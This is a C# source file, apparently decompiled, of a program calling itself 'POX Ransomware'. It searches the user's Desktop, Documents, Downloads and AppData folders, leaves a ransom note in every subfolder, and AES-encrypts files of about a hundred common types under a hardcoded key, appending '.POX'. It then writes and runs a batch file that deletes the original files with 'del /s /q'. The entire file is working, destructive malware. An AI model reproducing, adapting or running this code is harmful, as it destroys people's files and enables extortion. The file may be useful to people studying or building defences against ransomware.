using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Analysis;

public class Program
{
	private static void makeRansomFile(string Path)
	{
		string path = Path + "\\POX_RANSOM";
		PrintColor.SetConsoleTextColor(ConTextColor.GREEN);
		StreamWriter streamWriter = new StreamWriter(path);
		streamWriter.WriteLine("POX Ransom infected");
		streamWriter.WriteLine("Please Decrypt !");
		streamWriter.WriteLine("96 81 B9 72 2E 15 90 E4 87 42 B3 9D D8 C6 07 48 49 8A 3F 4F 78 A1 76 65 41 16 72 D3 DD F8 A9 51 E7 86 C2 05 92 4D CA BA 0F 0B BE 35 1F C7 A8 88 54 36 A2 A8 3E BB B5 CA 3F 0F AC DC 76 B2 8E FC 77 77 47 A2 56 15 39 D2 62 9E D3 99 83 CE ED B4 67 BC B7 88 74 97 F6 BB 0B 0C 12 BC 1F F0 94 19 19 0C 72 03 94 CA EC DC A0 0D 11 B0 08 3F 62 F9 02 02 FC FB 77 31 49 A8 81 7B 98 B7 34 51 76 AB 43 C8 90 03 55 68 F2 81 7B 55 A7 BC 3B B4 2E C9 BC 81 59 4E 0D 0F 5B 2E DF 6C 3A A1 59 BB 0F 8A 53 A7 B5 0F 96 69 C3 BA 61 53 B8 79 55 D6 39 D6 9B 17 93 09 8F 44 54 BC 63 27 99 EC 04 C2 74 37 C9 17 4A 7A 5A D9 94 9B 08 C7 EF 35 9D E9 C5 C3 61 1D 72 C6 0A 89 2B F5 16 4C B0 7F 5C 03 FB E5 78 01 D5 47 BF 09 D1 92 3F 9F EE 8E 72 C5 93 35 4D 4A C3 F9 F3 50 BA C8 50 F3 74 2B C9 31 01 02 2D 38 FD 21 CF A9 3F FB 86 C1 1E 1A 9F D4 3A 9F 42 F9 E0 42 04 89 B8 F5 90 89 93 FC F2 60 B4 82 88 12 26 CA 0A D2 F3 C9 E6 56 41 6A 90 F1 67 5E C1 DA 0A BB 49 92 6F 87 AE A8 D9 CD E2 44 A6 94 76 CB 52 54 8A 43 E4 10 A6 BD BB 0D 09 29 CE 95 1B F1 8D D9 1D 81 9C F8 79 18 91 30 77 0B 28 CA C4 22 C4 0C B4 91 50 C6 12 F6 61 E0 78 CC F6 2E B1 D0 84 CA AE AE 2C 77 4B BD 5F 42 C8 19 06 F7 36 F7 95 45 02 96 6E 0F 8A DA CD B7 D1 9E A2 B6 D6 72 C5 93 63 90 A8 60 96 D2 52 ED A0 1A 37 49");
		streamWriter.Close();
		PrintColor.SetConsoleTextColor(ConTextColor.GRAY);
	}

	private static void makeBat(int check, string Path, List<string> extension)
	{
		if (check == 0)
		{
			string text = Path;
			string path = Path + "\\delete.bat";
			text += "\\";
			StreamWriter streamWriter = new StreamWriter(path);
			streamWriter.WriteLine("@echo off");
			for (int i = 0; i < extension.Count; i++)
			{
				streamWriter.WriteLine("del /s /q " + text + "\\*" + extension[i]);
			}
			streamWriter.WriteLine("del " + text + "delete.bat");
			streamWriter.Close();
		}
		if (check == 1)
		{
			string text2 = Path;
			string text3 = Path;
			text2 += "\\decrypt.bat";
			text3 += "\\";
			StreamWriter streamWriter2 = new StreamWriter(text2);
			streamWriter2.WriteLine("@echo off");
			streamWriter2.WriteLine("del /s/ q " + text3 + "\\*" + extension[0]);
			streamWriter2.WriteLine("del /s /q " + text2);
			streamWriter2.Close();
		}
	}

	private static void Usage()
	{
		PrintColor.SetConsoleTextColor(ConTextColor.RED);
		Console.WriteLine("This is POX Ransomware");
		PrintColor.SetConsoleTextColor(ConTextColor.GRAY);
		Console.WriteLine("-enc \n Same Directory Finding Weak Ransomware Extension");
		PrintColor.SetConsoleTextColor(ConTextColor.GRAY);
		Console.WriteLine("-dec \n Find POX Extension -> Decrypt File ");
		PrintColor.SetConsoleTextColor(ConTextColor.GRAY);
		Console.WriteLine("-help is Information");
	}

	private static List<FileInfo> DirSearch(string sDir, List<FileInfo> temp = null)
	{
		new List<string> { "My Music", "My Pictures", "My Videos" };
		if (temp == null)
		{
			temp = new List<FileInfo>();
		}
		DirectoryInfo directoryInfo = new DirectoryInfo(sDir);
		string[] directories = Directory.GetDirectories(sDir);
		foreach (string text in directories)
		{
			try
			{
				Console.WriteLine(text + " ACCESS PERMITTED");
				makeRansomFile(text);
				DirSearch(text, temp);
			}
			catch (UnauthorizedAccessException)
			{
				PrintColor.SetConsoleTextColor(ConTextColor.RED);
				Console.WriteLine(text + " Permission Deny");
				PrintColor.SetConsoleTextColor(ConTextColor.GRAY);
			}
		}
		FileInfo[] files = directoryInfo.GetFiles();
		foreach (FileInfo item in files)
		{
			temp.Add(item);
		}
		return temp;
	}

	private static void Main(string[] args)
	{
		bool flag = false;
		string text = null;
		string key = "Pxkdgjdiq30adkag";
		List<string> list = new List<string>
		{
			"dll", "so", "rpm", "deb", "vmlinuz", "img", "jpg", "jpeg", "bmp", "gif",
			"png", "svg", "psd", "raw", "mp3", "mp4", "m4a", "aac", "ogg", "flac",
			"wav", "wma", "aiff", "ape", "avi", "flv", "m4v", "mkv", "mov", "mpg",
			"mpeg", "wmv", "swf", "3gp", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
			"odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md", "yml",
			"yaml", "json", "xml", "csv", "db", "sql", "dbf", "mdb", "iso", "html",
			"htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css", "c", "cpp",
			"cxx", "h", "hpp", "hxx", "java", "class", "jar", "ps", "vb", "awk",
			"sh", "cgi", "pl", "ada", "swift", "go", "py", "pyc", "bf", "coffee",
			"zip", "tar", "tgz", "bz2", "7z", "rar", "bak"
		};
		List<string> list2 = new List<string> { ".POX" };
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string item = Environment.ExpandEnvironmentVariables("%AppData%\\Roaming\\");
		string item2 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		PrintColor.SetConsoleTextColor(ConTextColor.BLUE);
		List<string> list3 = new List<string> { folderPath, folderPath2, item2, folderPath3, item };
		flag = true;
		try
		{
			if (!flag)
			{
				return;
			}
			for (int i = 0; i < list3.Count; i++)
			{
				string fileName = list3[i] + "\\delete.bat";
				string text2 = list3[i];
				List<FileInfo> list4 = DirSearch(text2);
				new DirectoryInfo(text2);
				foreach (FileInfo item3 in list4)
				{
					string fullName = item3.FullName;
					string[] array = fullName.Split(new char[1] { '.' });
					for (int j = 0; j < list.Count; j++)
					{
						if (string.Compare(array[^1], list[j], ignoreCase: true) == 0)
						{
							text = fullName + list2[0];
							ENCRYPT(fullName, text, key);
						}
					}
				}
				PrintColor.SetConsoleTextColor(ConTextColor.LIGHT_PURPLE);
				Console.WriteLine("Ransomware Working...");
				makeBat(0, text2, list);
				Process.Start(fileName);
			}
		}
		catch (Exception)
		{
			PrintColor.SetConsoleTextColor(ConTextColor.JADE);
			Console.WriteLine("Cannot access");
		}
	}

	public static void ENCRYPT(string _inputFile, string outputFile, string key)
	{
		try
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] bytes = Encoding.UTF8.GetBytes(key);
			for (int i = 0; i < bytes.Length; i++)
			{
				bytes[i] = Convert.ToByte(Convert.ToInt32(bytes[i]) ^ 0x82);
			}
			byte[] bytes2 = Encoding.UTF8.GetBytes(key);
			using FileStream stream = new FileStream(outputFile, FileMode.Create);
			using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes, bytes2);
			using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
			using FileStream fileStream = new FileStream(_inputFile, FileMode.Open);
			int num;
			while ((num = fileStream.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			string.Concat(Directory.GetCurrentDirectory() + "\\", _inputFile);
		}
		catch (Exception)
		{
		}
	}
}
